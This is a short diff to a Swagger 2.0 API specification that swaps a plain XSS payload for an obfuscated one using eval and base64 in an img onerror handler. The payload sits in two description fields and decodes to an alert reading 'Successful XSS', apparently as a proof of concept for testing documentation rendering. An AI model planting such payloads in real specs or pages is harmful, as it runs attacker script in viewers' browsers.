@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <img/asddds/onerror=alert(1) src=a>
+    <svg><p><!----><img src=x onerror="eval(atob('YWxlcnQoJ1N1Y2Nlc3NmdWwgWFNTJyk='))"></svg>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <img/asddds/onerror=alert(1) src=a>
+            <svg><p><!----><img src=x onerror="eval(atob('YWxlcnQoJ1N1Y2Nlc3NmdWwgWFNTJyk='))"></svg>
 
           format: int64
           in: path
